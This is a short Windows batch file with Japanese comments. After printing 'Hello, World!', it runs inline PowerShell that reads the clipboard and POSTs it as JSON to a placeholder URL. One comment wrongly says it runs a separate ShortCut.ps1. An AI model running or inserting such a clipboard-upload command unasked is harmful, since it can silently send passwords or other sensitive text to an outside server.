@echo off
echo Hello, World!
@REM 同じフォルダにあるShortCut.ps1を実行する
@echo off
powershell -command "
$clipboardData = Get-Clipboard; # クリップボードからデータを取得
$json = ConvertTo-Json -InputObject @{data=$clipboardData}; # データをJSON形式に変換
Invoke-RestMethod -Uri 'http://your-url.com' -Method Post -Body $json -ContentType 'application/json' # JSONデータをPOSTリクエストのボディとして送信
"
pause
